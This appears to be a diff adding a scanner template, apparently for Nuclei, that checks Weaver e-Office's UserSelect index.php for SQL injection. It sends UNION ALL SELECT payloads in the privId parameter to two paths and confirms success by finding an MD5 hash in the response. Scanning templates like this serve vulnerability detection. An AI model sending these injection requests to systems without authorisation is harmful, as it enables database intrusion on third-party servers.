@@ -1,0 +1,32 @@
+id: e-office-index-sqli
+
+info:
+  name: SQL Injection in e-Office index.php
+  author: onewin
+  severity: high
+  description: |
+    Possible SQL Injection vulnerability in e-Office's index.php allowing attackers to execute arbitrary SQL queries.
+  tags: 泛微-EOffice,泛微-协同办公OA
+
+http:
+  - raw:
+      - |
+        GET /E-mobile/App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123))-- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+      - |
+        GET /App/System/UserSelect/index.php?m=getUserLists&privId=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5(123))-- HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "202cb962ac59075b964b07152d234b70" # MD5 hash of 123
+        part: body
+
+      - type: status
+        status:
+          - 200
